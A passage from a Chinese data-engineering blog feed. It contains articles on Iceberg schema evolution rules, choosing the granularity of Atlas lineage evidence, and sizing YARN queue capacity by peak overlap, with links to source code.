<p>可观测性做完的标志，不是页面多了三张曲线，而是拿到任意一个失败实例 ID，可以沿确定关系找到它提交的真实 application、所有 attempt 与 container、当时的配置和代码、输入输出水位，再用同样条件做一次受控重现。能走完这条链路，排障才从“经验搜索”变成证据判断。</p>
<h2 id="对照规范与源码"><a href="#对照规范与源码" class="headerlink" title="对照规范与源码"></a>对照规范与源码</h2><ul>
<li><a href="https://github.com/open-telemetry/opentelemetry-specification/blob/d139f05db0f25acdb34c8e30efbc4674498f2c6c/specification/logs/data-model.md#L171-L212">OpenTelemetry 1.6 Logs Data Model：Timestamp、TraceId、SpanId、Resource 与 Attributes</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-specification/blob/d139f05db0f25acdb34c8e30efbc4674498f2c6c/specification/resource/sdk.md#L1-L29">OpenTelemetry 1.6 Resource：用不可变属性描述遥测来源实体</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-specification/blob/d139f05db0f25acdb34c8e30efbc4674498f2c6c/specification/trace/api.md#L183-L220">OpenTelemetry 1.6 Trace API：SpanContext 中的 TraceId 与 SpanId</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-specification/blob/d139f05db0f25acdb34c8e30efbc4674498f2c6c/specification/trace/api.md#L398-L420">OpenTelemetry 1.6 Trace API：span link 可连接其他 trace 中的工作</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-api/src/main/java/org/apache/hadoop/yarn/api/records/ApplicationAttemptId.java#L30-L38">Hadoop 3.3.0 <code>ApplicationAttemptId</code>：同一应用可因临时故障产生多次 attempt</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-api/src/main/java/org/apache/hadoop/yarn/api/records/ContainerId.java#L39-L80">Hadoop 3.3.0 <code>ContainerId</code>：Container 关联 ApplicationAttemptId</a></li>
</ul>
]]></content>
      <categories>
        <category>数据平台</category>
      </categories>
      <tags>
        <tag>可观测性</tag>
        <tag>任务调度</tag>
        <tag>OpenTelemetry</tag>
      </tags>
  </entry>
  <entry>
    <title>Schema Evolution 为什么不能只检查字段名：Iceberg Field ID 与类型提升规则</title>
    <url>//2021/11/22/schema-evolution-rules/</url>
    <content><![CDATA[<p>数据平台上的 schema 变更，最危险的往往不是 ALTER TABLE 报错，而是 ALTER 成功、任务也能跑，结果却把旧字段读成了另一个含义。</p>
<p>按字段位置读取的系统里，删除第二列后，后面的列全部向前移动；按字段名读取的系统里，先删除 <code>status</code>，过一段时间又新建同名字段，旧文件中的 <code>status</code> 可能被误认为新字段。单看最新 DDL，两次操作都合法，历史数据的语义却已经混在一起。</p>
<p>Apache Iceberg 0.12.0 用永不复用的 Field ID 跟踪列。改名和重排只改变显示信息，字段身份不变；删除后再添加同名列会拿到新 ID，旧数据不会“复活”。这套规则很适合用来理解 schema evolution 的核心：兼容性不是比较两份字段名列表，而是判断字段身份、类型和值域能否连续解释。</p>
<p class="article-diagram-scroll"><img src="/images/articles/schema-evolution-rules.svg" class="lazyload" data-srcset="/images/articles/schema-evolution-rules.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Schema Evolution 从变更申请到读写验证"></p>
<span id="more"></span>

<h2 id="字段名和位置都不是稳定身份"><a href="#字段名和位置都不是稳定身份" class="headerlink" title="字段名和位置都不是稳定身份"></a>字段名和位置都不是稳定身份</h2><p>一个 schema 里有三列：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">id:       field-id=1</span><br><span class="line">status:   field-id=2</span><br><span class="line">amount:   field-id=3</span><br></pre></td></tr></table></figure>

<p>把 <code>status</code> 改名为 <code>order_status</code> 时，Field ID 仍是 2。旧 Parquet 文件无需重写，reader 按 ID 投影，知道新名字对应旧文件里的同一个字段。把列顺序改成 <code>id, amount, order_status</code>，ID 也不变，<code>amount</code> 不会因为位置变了就读到 status 的值。</p>
<p>如果删除 field-id 2，后来又添加一个叫 <code>status</code> 的新列，新列必须得到新的 ID，例如 4。名字相同不代表语义相同，旧文件里 ID 2 的数据不能投影到 ID 4。Iceberg 文档明确写明 Field ID 在一张表中永不复用。</p>
<p>这条规则也适用于 nested struct。<code>address.city</code> 改名、重排或删除时，嵌套字段仍要有自己的身份。只给顶层列分配 ID，无法安全处理复杂类型的演进。</p>
<p>我在元数据平台里会保留 <code>field_id</code>、parent ID、变更前后名称和 schema version。血缘与质量规则尽量绑定稳定 ID，再把当前字段名作为展示。否则一次 rename 会让平台误判为“旧列下线、新列上线”，历史血缘全部断开。</p>
<h2 id="新增-Optional-与新增-Required-不是一件事"><a href="#新增-Optional-与新增-Required-不是一件事" class="headerlink" title="新增 Optional 与新增 Required 不是一件事"></a>新增 Optional 与新增 Required 不是一件事</h2><p>向已有表增加 optional 列，旧文件没有这个 Field ID，读取时可以返回 null，不需要重写数据。这是典型的向后兼容变更。</p>
<p>新增 required 列就不同。旧数据没有该字段，reader 无法凭空构造一个满足非空约束的值。Iceberg 的 <code>UpdateSchema</code> 把它明确标为 incompatible change，默认会拒绝，只有调用 <code>allowIncompatibleChanges()</code> 才允许绕过检查。</p>
<p>“允许绕过”不等于旧数据自动兼容。平台如果确实需要把 optional 改成 required，我会拆成几个步骤：</p>
<ol>
<li>新字段先以 optional 发布，生产端开始写入；</li>
<li>对历史 snapshot 做回填，并验证 null 数为 0；</li>
<li>检查所有 writer 已升级，不会继续产生 null；</li>
<li>再提交 required 约束；</li>
<li>对仍使用旧 schema 的 consumer 做回归。</li>
</ol>
<p>默认值也要区分写入默认和读取默认。新 writer 没传值时填 0，不代表旧文件读取 ID 4 时自然就有 0。若表格式或引擎没有定义 read default，业务不能用一句“默认 0”掩盖 null。</p>
<p>把 required 直接加上去，往往只是把兼容性问题推给某个较晚升级的 reader。</p>
<h2 id="类型变化只能在不会误解旧值时放行"><a href="#类型变化只能在不会误解旧值时放行" class="headerlink" title="类型变化只能在不会误解旧值时放行"></a>类型变化只能在不会误解旧值时放行</h2><p>Iceberg 0.12.0 的 <code>TypeUtil.isPromotionAllowed()</code> 允许的提升很克制：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">int    -&gt; long</span><br><span class="line">float  -&gt; double</span><br><span class="line">decimal(P,S) -&gt; decimal(P&#x27;,S)，P&#x27; &gt;= P 且 scale 不变</span><br></pre></td></tr></table></figure>

<p><code>long -&gt; int</code> 会截断，<code>double -&gt; float</code> 会损失精度，自然不能作为无重写的 schema evolution。Decimal 只扩大 precision、保持 scale，是因为把 <code>decimal(10,2)</code> 解释成 <code>decimal(18,2)</code> 不改变小数点含义；改成 <code>decimal(18,4)</code> 虽然存储范围更大，数值尺度已经变化。</p>
<p>String 改 timestamp、bigint 改 string 这类“引擎能 CAST”也不等于表 schema 可直接修改。CAST 是一次显式计算，可以报告脏值；metadata-only evolution 要求所有旧文件都能按新类型安全读取。两者的风险边界不同。</p>
<p>需要不兼容类型变更时，我更愿意新建字段：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">amount_string  <span class="operator">-</span><span class="operator">&gt;</span> 新增 amount_decimal</span><br></pre></td></tr></table></figure>

<p>生产端双写一段时间，离线回填旧数据，比较转换失败数和金额聚合，消费者切换后再删除旧字段。虽然步骤多，但每一步有独立回滚点。直接把列类型改掉，一旦部分引擎缓存旧 schema，错误会同时出现在读写两端。</p>
<p>类型校验还要进入分区规则。Iceberg 源码在 promotion 函数上特意警告：修改规则前要确认不会给 partitioning 引入兼容问题。一个字段既是业务列又参与 partition transform 时，类型变化会影响文件裁剪与新旧 partition spec 的解释，不能只跑一次 <code>SELECT LIMIT 10</code>。</p>
<h2 id="删除列只是从当前-Schema-隐藏"><a href="#删除列只是从当前-Schema-隐藏" class="headerlink" title="删除列只是从当前 Schema 隐藏"></a>删除列只是从当前 Schema 隐藏</h2><p>Iceberg schema update 是 metadata change，不会为了 drop column 立即重写所有 data file。旧文件中的物理字节仍然存在，只是新 schema 不再投影这个 Field ID。</p>
<p>这对性能有好处，对数据治理却有两个提醒。</p>
<p>第一，删除敏感字段不等于物理擦除。如果合规要求数据不可恢复，还要重写相关文件并处理保留的 snapshots、备份与对象版本。<code>ALTER TABLE DROP COLUMN</code> 只改变当前逻辑视图。</p>
<p>第二，历史 snapshot 仍可能用旧 schema 读取该字段。Time travel 和 rollback 是表格式能力，也意味着 schema 生命周期不能只看 current version。过期 snapshot 之前，存储清理和权限策略都要考虑旧版本。</p>
<p>同名重建必须拿新 Field ID，正是为了避免旧数据在逻辑上被重新暴露。元数据平台应把“rename”与“drop + add”作为两种不同操作审计：前者保持字段身份，后者创建新语义。只比较变更前后的名字，会把两者误判成一样。</p>
<h2 id="表格式兼容不等于整条链路兼容"><a href="#表格式兼容不等于整条链路兼容" class="headerlink" title="表格式兼容不等于整条链路兼容"></a>表格式兼容不等于整条链路兼容</h2><p>Iceberg 接受一次 schema update，只能证明表格式规则允许提交。上游 CDC、消息格式、计算引擎、UDF 和下游数据库可能有各自的 schema 缓存与兼容约束。</p>
<p>例如新列在 Iceberg 中是 optional，旧 reader 可以忽略，看似兼容；Kafka 消息使用严格 schema，消费者却可能因未知字段反序列化失败。列 rename 在 Iceberg 里依赖 Field ID 保持语义，但经 JDBC 导出到按字段名映射的目标库，目标端仍然会看到旧列消失、新列出现。</p>
<p>我会为一次变更画出生产者和消费者矩阵：</p>
<table>
<thead>
<tr>
<th>组件</th>
<th>需要验证的内容</th>
</tr>
</thead>
<tbody><tr>
<td>源库 &#x2F; CDC</td>
<td>DDL 与行事件顺序，旧事件按什么 schema 解码</td>
</tr>
<tr>
<td>消息层</td>
<td>schema 兼容策略，key 是否变化</td>
</tr>
<tr>
<td>批流引擎</td>
<td>connector 版本、catalog cache、投影与类型支持</td>
</tr>
<tr>
<td>表格式</td>
<td>Field ID、允许的 promotion、snapshot 提交</td>
</tr>
<tr>
<td>下游接口</td>
<td>字段名、顺序、nullability 与序列化契约</td>
</tr>
</tbody></table>
<p>上线顺序通常是“先让 reader 能读新旧两种形态，再升级 writer，最后收紧约束”。破坏性变更则用新字段或新版本 topic&#x2F;table 过渡。先改 writer，再等 consumer 报错，是把兼容性测试放到了生产环境。</p>
<h2 id="变更记录要能够解释每个历史文件"><a href="#变更记录要能够解释每个历史文件" class="headerlink" title="变更记录要能够解释每个历史文件"></a>变更记录要能够解释每个历史文件</h2><p>一个成熟的 schema registry 不只保存最新 JSON。至少要记录 schema version、Field ID 映射、变更类型、提交人、兼容性结论、表 snapshot ID、生效时间和受影响消费者。</p>
<p>读取故障发生时，需要回答某个 data file 是用哪个 schema 写的、当前 reader 用什么 schema 投影、中间经历过哪些 rename&#x2F;drop&#x2F;type promotion。没有版本链，只能看当前字段名猜历史。</p>
<p>发布校验也不应止于 ALTER 成功。我会准备包含 null、边界数值、旧 schema 文件、新 schema 文件和嵌套结构的样本，让当前与上一版 reader 都读取；再用实际查询验证列裁剪、partition pruning 和聚合结果。涉及 CDC 时，还要在 DDL 前后各写一批行，确认 schema history 能按事件位置恢复。</p>
<p>Schema evolution 真正解决的是旧数据、当前写入和未来 reader 如何共同存在。字段名只是人看到的标签，稳定身份与明确的兼容规则才是系统能长期演进的基础。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/site/docs/evolution.md#L18-L36">Iceberg 0.12.0 Table Evolution：支持的 schema 变更与 metadata-only 边界</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/site/docs/evolution.md#L38-L50">Iceberg 0.12.0 Correctness：用唯一 Field ID 避免 rename、drop 与 reorder 误读</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/site/docs/schemas.md#L30-L41">Iceberg 0.12.0 Schema：Field ID 在一张表内永不复用</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/api/src/main/java/org/apache/iceberg/UpdateSchema.java#L133-L158"><code>UpdateSchema</code>：新增 required 列与 optional -&gt; required 属于不兼容变更</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/core/src/main/java/org/apache/iceberg/SchemaUpdate.java#L247-L269"><code>SchemaUpdate.updateColumn()</code>：类型变更调用 promotion 校验</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/api/src/main/java/org/apache/iceberg/types/TypeUtil.java#L235-L258"><code>TypeUtil.isPromotionAllowed()</code>：int&#x2F;float&#x2F;decimal 的安全提升规则</a></li>
<li><a href="https://github.com/apache/iceberg/blob/7ca1044655694dbbab660d02cef360ac1925f1c2/site/docs/spec.md#L180-L196">Iceberg 0.12.0 Spec：schema evolution 的合法类型提升</a></li>
</ul>
]]></content>
      <categories>
        <category>数据治理</category>
      </categories>
      <tags>
        <tag>Apache Iceberg</tag>
        <tag>Schema Evolution</tag>
        <tag>数据契约</tag>
      </tags>
  </entry>
  <entry>
    <title>数据血缘记录到表还是字段才够用：按问题选择证据粒度</title>
    <url>//2021/11/25/lineage-evidence-granularity/</url>
    <content><![CDATA[<p>血缘项目最容易交付的是一张很大的图：点开一张表，左边几十张上游表，右边几十张下游表，连线铺满屏幕。演示时很直观，真正遇到问题却常常答不出来。</p>
<p>“改这个字段会影响谁”需要字段与表达式；“昨晚这批数据为什么错”需要运行实例、代码版本和输入输出水位；“这张表有哪些上游”用表级关系就够。把三种问题都塞进同一张表级拓扑，图再完整也只能回答资产发现。</p>
<p>Apache Atlas 2.1 的模型本身已经给出几种层次：基础 <code>Process</code> 通过 inputs&#x2F;outputs 连接 DataSet；Hive 还有 <code>hive_column_lineage</code>，保存字段依赖和 expression；模型里也有 <code>ProcessExecution</code> 与 <code>hive_process_execution</code> 表达具体执行。关键不在于有没有这些类型，而是采集和查询时是否保留了问题需要的证据。</p>
<p class="article-diagram-scroll"><img src="/images/articles/lineage-evidence-granularity.svg" class="lazyload" data-srcset="/images/articles/lineage-evidence-granularity.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="数据血缘的四层证据粒度"></p>
<span id="more"></span>

<h2 id="表级血缘适合找范围，不适合解释字段"><a href="#表级血缘适合找范围，不适合解释字段" class="headerlink" title="表级血缘适合找范围，不适合解释字段"></a>表级血缘适合找范围，不适合解释字段</h2><p>Atlas 的基础模型把 <code>Process</code> 定义为一种 Asset，拥有 <code>inputs: array&lt;DataSet&gt;</code> 和 <code>outputs: array&lt;DataSet&gt;</code>。一条 Hive SQL 读表 A、B，写表 C，可以形成：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">table A ----\</span><br><span class="line">             &gt; process P ----&gt; table C</span><br><span class="line">table B ----/</span><br></pre></td></tr></table></figure>

<p>这层关系适合回答：C 的直接上游有哪些；删除 A 可能影响哪些下游表；某个数据域跨过了哪些系统。它也是大范围影响分析的入口，存储和查询成本相对可控。</p>
<p>但如果 SQL 是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  a.order_id,</span><br><span class="line">  a.amount <span class="operator">-</span> <span class="built_in">coalesce</span>(b.refund_amount, <span class="number">0</span>) <span class="keyword">as</span> paid_amount</span><br><span class="line"><span class="keyword">from</span> orders a</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> refunds b <span class="keyword">on</span> a.order_id <span class="operator">=</span> b.order_id;</span><br></pre></td></tr></table></figure>

<p>表级血缘只能说明 <code>orders</code>、<code>refunds</code> 都流向结果表，不能说明修改 <code>refund_amount</code> 会影响 <code>paid_amount</code>，也不能区分 <code>order_id</code> 只是 join key 还是直接复制到输出。</p>
<p>因此表级 impact 的结果应该写成“候选影响范围”，而不是“确定受影响字段”。它能缩小排查面，不能替代转换证据。</p>
<h2 id="字段级血缘必须带依赖类型和表达式"><a href="#字段级血缘必须带依赖类型和表达式" class="headerlink" title="字段级血缘必须带依赖类型和表达式"></a>字段级血缘必须带依赖类型和表达式</h2><p>Atlas Hive 模型把 <code>hive_column_lineage</code> 设为 <code>Process</code> 子类型，用 inputs&#x2F;outputs 连接输入与输出列，并提供 <code>dependencyType</code> 与 <code>expression</code>。官方 Hive Hook 文档列了三种依赖：</p>
<ul>
<li><code>SIMPLE</code>：输出列与输入值相同；</li>
<li><code>EXPRESSION</code>：输出由 SQL 表达式转换；</li>
<li><code>SCRIPT</code>：输出由用户脚本转换。</li>
</ul>
<p>只记录 <code>refund_amount -&gt; paid_amount</code> 仍然不够。表达式 <code>amount - coalesce(refund_amount, 0)</code> 说明影响方式，也暴露了 null 处理；如果新版本改成 <code>greatest(amount - refund_amount, 0)</code>，边仍然连接同样的字段，业务语义已经变化。</p>
<p>我会让一条字段血缘至少包含：输入字段稳定 ID、输出字段稳定 ID、依赖类型、归一化表达式、解析器版本、所属 process&#x2F;version，以及无法解析时的原始 SQL 位置。字段名会 rename，稳定 ID 才能连接历史；表达式解析也会升级，不能把旧解析结果当成永远正确。</p>
<p><code>select *</code>、UDF、动态 SQL 和脚本是覆盖率薄弱点。平台应显示“已解析 8&#x2F;10 个输出字段”，并列出两个 unresolved，而不是为了让图完整，把整张输入表的所有列都连到所有输出列。错误的精确关系比缺失更危险。</p>
<h2 id="运行级血缘回答的是“哪一次”"><a href="#运行级血缘回答的是“哪一次”" class="headerlink" title="运行级血缘回答的是“哪一次”"></a>运行级血缘回答的是“哪一次”</h2><p>静态 process 描述任务通常怎样读写。生产问题发生在一次具体执行：某天补数使用了旧参数，读到错误分区，写出一版异常数据。只看最新 SQL，可能已经修复；只看表级边，又不知道是哪一轮实例产生了目标分区。</p>
<p>运行级血缘需要把 ProcessExecution 与调度实例关联起来。我会保存：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">process_id / process_version</span><br><span class="line">schedule_instance_id / attempt_id</span><br><span class="line">engine_application_id</span><br><span class="line">start_time / end_time / result</span><br><span class="line">input table snapshot / partition / offset</span><br><span class="line">output snapshot / partition / commit id</span><br><span class="line">code_version / config_version</span><br></pre></td></tr></table></figure>

<p>这样一条链路不再只是 <code>A -&gt; P -&gt; C</code>，而是“2021-11-24 的 attempt 2，使用 process version 17，读取 A 的 dt&#x3D;23 与 B 的 snapshot 291，提交了 C 的 dt&#x3D;23”。</p>
<p>字段级告诉我 <code>paid_amount</code> 来自哪些输入；运行级告诉我昨晚那一批到底读了哪些版本。故障诊断通常需要二者交叉，不能选一个代替另一个。</p>
<p>运行关系也不应该覆盖静态 process。任务每天运行一次，静态定义只有一份，execution 会不断增长。两类实体生命周期不同，混在一个节点里会让“修改任务”和“追溯历史”互相污染。</p>
<h2 id="血缘不是-SQL-解析结果的另一个名字"><a href="#血缘不是-SQL-解析结果的另一个名字" class="headerlink" title="血缘不是 SQL 解析结果的另一个名字"></a>血缘不是 SQL 解析结果的另一个名字</h2><p>SQL parser 能从文本推导潜在输入输出，这是很重要的来源，却不一定等于真实运行。</p>
<p>任务可能根据参数拼接分区，代码分支在不同日期选择不同表；视图在运行时展开；UDF 内部访问外部数据；执行前后脚本又写了其他路径。反过来，一段 SQL 包含备用分支，实际运行并没有触发。</p>
<p>我会把证据来源分开：</p>
<table>
<thead>
<tr>
<th>来源</th>
<th>能证明什么</th>
<th>主要边界</th>
</tr>
</thead>
<tbody><tr>
<td>静态 SQL&#x2F;代码解析</td>
<td>设计上可能访问的对象与表达式</td>
<td>动态 SQL、UDF、条件分支</td>
</tr>
<tr>
<td>引擎 plan &#x2F; hook</td>
<td>本次编译或执行识别的输入输出</td>
<td>hook 覆盖、引擎版本、优化改写</td>
</tr>
<tr>
<td>运行输入输出水位</td>
<td>本次实际读取与提交的版本</td>
<td>需要引擎和表格式暴露 ID</td>
</tr>
<tr>
<td>人工声明</td>
<td>外部脚本和无法解析的业务关系</td>
<td>可能过期，需要 owner 与复核时间</td>
</tr>
</tbody></table>
<p>每条边带 <code>source_type</code>、采集时间和置信度，查询者才能判断它是推断、声明还是运行事实。把它们合并成一条没有来源的实线，会让系统显得确定，实际无法审计。</p>
<p>Atlas Hive Hook 通过 Kafka notification 异步更新元数据，官方配置也推荐 <code>synchronous=false</code> 以避免拖慢 Hive 查询，并提供重试次数和队列大小。这是合理的性能选择，也意味着查询成功和血缘入库成功不是同一个事务。Hook 队列满、通知失败或 Atlas 不可用时，运行已完成，血缘可能缺失。</p>
<p>因此采集链路本身要有指标：事件产生数、发送成功数、重试数、队列深度、消费延迟和死信。没有这组证据，“图上没边”无法区分确实无依赖，还是采集丢了。</p>
<h2 id="图的深度要由问题控制"><a href="#图的深度要由问题控制" class="headerlink" title="图的深度要由问题控制"></a>图的深度要由问题控制</h2><p>Atlas Lineage REST API 接受 <code>direction</code> 和 <code>depth</code>：可以查 INPUT、OUTPUT 或 BOTH，并限制跳数。这个设计比默认展开全图更实用。</p>
<p>做发布影响分析时，我通常先查输出方向 1 到 2 跳，找到直接消费任务和核心下游；需要追溯指标来源时，再沿输入方向逐层展开。一次返回全域图不仅慢，也让使用者无法区分直接与间接影响。</p>
<p>图查询还要处理环、共享维表和同一 process 的多版本。对于字段级血缘，一张宽表几百列，全部展开会产生大量节点。UI 可以先以表级聚合，用户选择某个字段后再加载 column lineage；运行实例则按时间和目标版本过滤，不要把三年 execution 全画出来。</p>
<p>我会让影响分析结果保持路径证据，例如：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">source.refund_amount</span><br><span class="line">  --[EXPRESSION: amount - coalesce(refund_amount, 0)]--&gt;</span><br><span class="line">dwd_order.paid_amount</span><br><span class="line">  --[SIMPLE]--&gt;</span><br><span class="line">ads_revenue.paid_amount</span><br></pre></td></tr></table></figure>

<p>有路径才能人工复核。只返回“影响 37 张表”这个计数，用户仍不知道最关键的传播链在哪里。</p>
<h2 id="完整度要能量化，而不是凭图判断"><a href="#完整度要能量化，而不是凭图判断" class="headerlink" title="完整度要能量化，而不是凭图判断"></a>完整度要能量化，而不是凭图判断</h2><p>血缘平台需要一组质量指标。基础层可以统计有 owner 的任务比例、成功执行中收到 hook 事件的比例、解析成功的输出字段比例、存在稳定 qualifiedName 的资产比例、运行实例能关联 input&#x2F;output version 的比例。</p>
<p>这些指标最好按引擎、项目和时间展示。Hive SQL 覆盖 95%，Python 脚本只有 20%，整体平均 80% 会掩盖真正的盲区。某次发布后 hook 成功率从 99% 掉到 70%，也应该像数据任务失败一样告警。</p>
<p>Atlas 的 <code>qualifiedName</code> 在基础模型中是必填、可索引且唯一的属性，Hive 文档又把 clusterName 放进库表列的 qualifiedName。多集群接入时，这一点尤其重要：<code>db.table</code> 在测试和生产同时存在，若资产身份没有环境&#x2F;集群维度，跨环境血缘会被错误合并。</p>
<p>最终我希望一张血缘图上的每条线都能回答三个问题：这是什么粒度，来自哪种证据，对应哪个版本或运行。能回答，血缘才可以用于变更审批和故障定位；回答不了，它更接近一张资产关系示意图。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/addons/models/0000-Area0/0010-base_model.json#L154-L196">Atlas 2.1 基础模型：Process 通过 inputs&#x2F;outputs 连接 DataSet</a></li>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/addons/models/0000-Area0/0010-base_model.json#L37-L49">Atlas 2.1 基础模型：qualifiedName 必填、索引且唯一</a></li>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/addons/models/1000-Hadoop/1030-hive_model.json#L80-L127">Atlas 2.1 Hive 模型：hive_process 保存 queryText</a></li>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/addons/models/1000-Hadoop/1030-hive_model.json#L435-L459">Atlas 2.1 Hive 模型：hive_column_lineage 与 expression</a></li>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/docs/src/documents/Hook/HookHive.md#L95-L108">Atlas Hive Hook：字段血缘的 SIMPLE、EXPRESSION 与 SCRIPT 依赖</a></li>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/docs/src/documents/Hook/HookHive.md#L61-L89">Atlas Hive Hook：异步通知、重试与队列配置</a></li>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/webapp/src/main/java/org/apache/atlas/web/rest/LineageREST.java#L79-L106"><code>LineageREST</code>：按 direction 与 depth 查询 lineage graph</a></li>
</ul>
]]></content>
      <categories>
        <category>数据治理</category>
      </categories>
      <tags>
        <tag>Apache Atlas</tag>
        <tag>元数据</tag>
        <tag>数据血缘</tag>
      </tags>
  </entry>
  <entry>
    <title>YARN 资源配额为什么不能按平均使用率分：用峰值重叠设计队列容量</title>
    <url>//2021/12/07/resource-quota-peak/</url>
    <content><![CDATA[<p>给数据团队分 YARN 配额时，一个常见算法是统计上个月平均使用率，再按比例切队列。A 部门平均用了 40%，就给 40% capacity；B 部门平均 20%，就给 20%。报表看起来有数据依据，到了每天凌晨，两个部门的关键任务一起跑，队列还是排满。</p>
<p>平均值描述长期资源消耗，不描述任务在 SLA 窗口内是否碰到一起。一个队列每天只忙两小时，平均使用率很低；这两小时如果正好承担日结、报表和下游出数，它需要的保证容量可能比全天平滑运行的队列更高。</p>
<p>CapacityScheduler 的 capacity 本来就不是一堵静态资源墙。它给队列保证一部分容量，空闲资源可以被其他队列借用，<code>maximum-capacity</code> 再限制弹性上界。配额设计的重点应该是关键时间窗口内的并发需求、可等待时间和资源回收速度，而不是把集群按月均比例永久切开。</p>
<p class="article-diagram-scroll"><img src="/images/articles/resource-quota-peak.svg" class="lazyload" data-srcset="/images/articles/resource-quota-peak.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="YARN 队列按峰值重叠与 SLA 设计容量"></p>
<span id="more"></span>

<h2 id="Capacity-是保证，不是预留空置机器"><a href="#Capacity-是保证，不是预留空置机器" class="headerlink" title="Capacity 是保证，不是预留空置机器"></a>Capacity 是保证，不是预留空置机器</h2><p>Hadoop 3.3.0 的 CapacityScheduler 文档把队列 capacity 定义为集群资源的一部分。队列内应用可以使用这部分保证容量；其他队列有空闲时，也可以暂时超过自己的 capacity。<code>maximum-capacity</code> 限制它最多借到哪里。</p>
<p>因此队列使用率超过 100% 不一定异常。它可能在借用父队列中的空闲资源，提高整个集群利用率。真正要观察的是：别的队列产生需求后，借出去的资源能否在业务允许的时间内归还。</p>
<p>若没有开启 preemption，已经分出去的 Container 通常要等自然结束，资源才会重新分配。一个借用资源的长任务每个 Container 运行数小时，即使保证队列突然有需求，也不能瞬间拿回。官方文档中，ResourceManager 的调度监控默认关闭；配置抢占策略后，才会按周期计算并回收超出保证容量的部分。</p>
<p>这就是“capacity 配对了，关键任务仍然等”的常见原因。纸面上保证 30%，运行中 30% 已被其他队列的长 Container 占用，回收又没有生效，保证只是最终会收敛的目标，不是毫秒级预留。</p>
<p>我会为保证容量增加一个时间维度：从队列产生 pending demand 到恢复 guaranteed capacity，P95 需要多久。只看当前 used&#x2F;capacity 比例，看不到资源归还是否符合 SLA。</p>
<h2 id="配额基线要看重叠峰值"><a href="#配额基线要看重叠峰值" class="headerlink" title="配额基线要看重叠峰值"></a>配额基线要看重叠峰值</h2><p>容量规划的数据粒度至少到 5 或 10 分钟。按天或按月平均，会把凌晨 01:00 到 02:00 的尖峰摊平。</p>
<p>我会先把每个队列的 demand、allocated、pending 和完成 SLA 放在同一条时间线上。Demand 是应用想要的资源，Allocated 是实际拿到的资源，两者不能混用。队列只分到 20%，allocated 曲线顶在 20%，并不能说明它只需要 20%；pending 可能一直在积压。</p>
<p>然后找峰值重叠：A 的日批、B 的模型训练和 C 的临时报表是否经常在同一个窗口出现。单独看各队列 P95 再相加可能过度配置，因为峰值未必同时发生；直接看集群总平均又会低估冲突。更合理的是基于历史时间片重放队列需求，观察各 SLA 窗口的联合分布。</p>
<p>一个简化的容量基线可以这样算：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">保证容量 = 在目标等待 SLA 内必须启动的工作负载需求</span><br><span class="line">弹性上界 = 保证容量 + 可借用的非关键/突发需求</span><br></pre></td></tr></table></figure>

<p>这不是一个固定公式。短任务可以在窗口内排队，交互查询可能要求几十秒启动；同样 100 core-hour，1 小时内完成和 10 小时内完成需要的并行容量完全不同。</p>
<p>规划结果还要落到内存与 vCore 两个维度。前一篇已经说明，默认 <code>DefaultResourceCalculator</code> 主要按内存比较；启用 DRF 后，CPU 型队列的主导资源才会进入公平计算。配额报表只画 memory%，CPU 已经饱和时会得出错误结论。</p>
<h2 id="Maximum-capacity-是防扩散边界"><a href="#Maximum-capacity-是防扩散边界" class="headerlink" title="Maximum-capacity 是防扩散边界"></a>Maximum-capacity 是防扩散边界</h2><p>共享集群有空闲时，让队列借用资源通常是好事。没有上界也会带来两个问题：一个批量补数把所有空闲 Container 占完，新到的交互任务需要等待回收；一个故障任务不断扩并发，把压力传到 HDFS、Shuffle 和目标数据库。</p>
